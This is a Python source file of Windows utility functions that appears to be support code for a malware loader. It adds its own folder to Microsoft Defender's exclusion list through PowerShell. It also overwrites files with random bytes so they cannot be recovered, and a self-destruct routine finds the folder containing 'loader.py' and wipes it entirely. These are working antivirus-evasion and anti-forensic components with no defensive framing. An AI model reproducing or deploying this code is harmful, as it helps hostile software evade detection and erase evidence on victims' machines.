import ctypes.wintypes
import subprocess
import os
import ctypes
import shutil
import sys

def is_admin():
    """ check for privilege """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def add_exclusion():
    """ 
    add current directory to exclusion list 
    return true if success
    """
    exclusion_path = os.path.dirname(os.path.abspath(__file__))
    ps_cmd = f"powershell.exe Add-MpPreference -ExclusionPath '{exclusion_path}'"

    try:
        result = subprocess.run(ps_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return True
        else:
            return False
    except Exception as e:
        pass

def wipe_file(file_path, passes=1):
    """ Write random bytes multiple times to avoid recovery """
    try:
        with open(file_path, "r+b") as file:
            length = os.path.getsize(file_path)
            for i in range(passes):
                file.seek(0)
                file.write(os.urandom(length))
        print(f"Wiped - {file_path}")
    except Exception as e:
        print(f"Wipe failed - {file_path} - {e}")
        return False

def root_folder(locate_file="loader.py"):
    """ Moves up the folder until this file is found """
    current_dir = os.path.dirname(os.path.realpath(__file__))
    while True:
        current_file = os.path.join(current_dir, locate_file)
        if os.path.isfile(current_file):
            print(f"Found - {current_file}")
            return current_dir
        
        parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
        if parent_dir == current_dir:
            print(f"Nothing found, reached end of filesystem")
            return None
        
        current_dir = parent_dir

# def delete_folder(folder_path):
#     """ Removes whole folder containing program """
#     try:
#         for root, dirs, files in os.walk(folder_path, topdown=False):
#             for name in files:
#                 file_path = os.path.join(root, name)
#                 wipe_file(file_path, passes=1)
#         shutil.rmtree(folder_path)
#         print(f"Deleted {folder_path}")
#     except:
#         return False

def delete_folder(folder_path):
    """ Deletes entire folder recursively after overwriting each file """
    try:
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for name in files:
                file_path = os.path.join(root, name)
                if not wipe_file(file_path, passes=1):
                    # print(f"failed to overwrite {file_path}. Continuing.")
                    pass
                try:
                    os.remove(file_path)
                    # print(f"deleted file - {file_path}")
                except Exception as e:
                    # print(f"failed to delete file {file_path} - {e}")
                    pass

            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    os.rmdir(dir_path)
                    # print(f"deleted directory - {dir_path}")
                except Exception as e:
                    # print(f"failed to delete directory {dir_path} - {e}")
                    pass

        # Finally, remove the root folder
        shutil.rmtree(folder_path, ignore_errors=False)
        # print(f"successfully deleted folder - {folder_path}")
    except Exception as e:
        # print(f"failed to delete folder {folder_path} - {e}")
        pass

def self_destruct(locate_file="loader.py"):
    """ destroy self """
    try:
        # current_pwd = os.path.realpath(__file__)
        # current_pwd = os.path.dirname(os.path.realpath(__file__))
        # os.remove(current_pwd)
        root = root_folder(locate_file)
        # delete_folder(current_pwd)
        if not root:
            print("Failed")
            return
        
        delete_folder(root)
        sys.exit(0)
    except:
        return False

def display_message(message, title="Notification", box_type="info"):
    """ display info box """
    if box_type == "info":
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)